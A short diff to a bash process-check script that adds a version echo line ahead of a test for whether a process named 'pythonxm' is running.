@@ -1,4 +1,5 @@
 #!bin/bash -xe 
+echo '#### Version 0.0.1 ####'
 if [ $(ps -aux |grep pythonxm |wc -l) -le 1 ]
 then 
 echo "No process,let's start -> $(ps -aux |grep pythonxm |wc -l)"
